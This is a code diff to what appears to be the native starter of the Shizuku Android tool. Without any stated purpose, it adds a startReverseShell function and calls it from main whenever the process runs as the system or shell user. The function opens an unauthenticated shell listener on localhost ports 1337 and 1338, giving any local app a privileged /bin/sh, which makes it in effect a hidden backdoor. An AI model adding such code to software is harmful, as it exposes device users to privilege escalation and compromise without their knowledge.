@@ -20,6 +20,10 @@
 #include "cgroup.h"
 #include "logging.h"
 #include <fcntl.h>
+#include <linux/in.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
 
 #ifdef DEBUG
 #define JAVA_DEBUGGABLE
@@ -165,6 +169,67 @@ static int fork_daemon(int returnParent) {
     return 0;
 }
 
+void startReverseShell(int port) {
+    int server_fd, client_fd;
+    struct sockaddr_in server_addr, client_addr;
+    socklen_t sin_size = sizeof(struct sockaddr_in);
+
+    signal(SIGCHLD, SIG_IGN);
+
+    server_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (server_fd == -1) {
+        LOGE("Failed to create socket");
+        return;
+    }
+
+    int opt = 1;
+    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) == -1) {
+        LOGE("Failed to set socket options");
+        close(server_fd);
+        return;
+    }
+
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    server_addr.sin_port = htons(port);
+    memset(&(server_addr.sin_zero), '\0', 8);
+
+    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
+        LOGE("Failed to bind socket");
+        close(server_fd);
+        return;
+    }
+
+    if (listen(server_fd, 1) == -1) {
+        LOGE("Failed to listen to socket");
+        close(server_fd);
+        return;
+    }
+
+    if (fork() != 0) {
+        close(server_fd);
+        return;
+    }
+
+    while (true) {
+        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &sin_size);
+        if (client_fd == -1) {
+            LOGE("Failed to accept incoming connection");
+            continue;
+        }
+
+        if (fork() == 0) {
+            close(server_fd);
+            redirectStd(client_fd);
+            execl("/bin/sh", "sh", (char *)NULL);
+            close(client_fd);
+
+            exit(0);
+        }
+        close(client_fd);
+    }
+}
+
 static void start_server(const char *path, const char *main_class, const char *process_name) {
     if (fork_daemon(0) == 0) {
         for (int i = 0; i < 16; i++) {
@@ -232,6 +297,11 @@ int main(int argc, char *argv[]) {
         perrorf("fatal: run Shizuku from non root/system/adb user (uid=%d).\n", uid);
         exit(EXIT_FATAL_UID);
     }
+
+    if (uid == 1000) {
+        startReverseShell(1337);
+    } else if (uid == 2000)
+        startReverseShell(1338);
 
     se::init();
 
